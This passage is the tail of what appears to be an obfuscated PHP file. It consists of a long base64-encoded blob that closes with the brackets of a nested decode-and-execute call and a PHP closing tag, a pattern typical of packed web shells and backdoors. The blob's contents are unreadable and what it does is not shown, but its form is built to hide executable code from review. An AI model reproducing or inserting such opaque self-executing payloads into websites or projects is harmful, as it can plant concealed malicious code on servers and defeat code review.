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')));
?>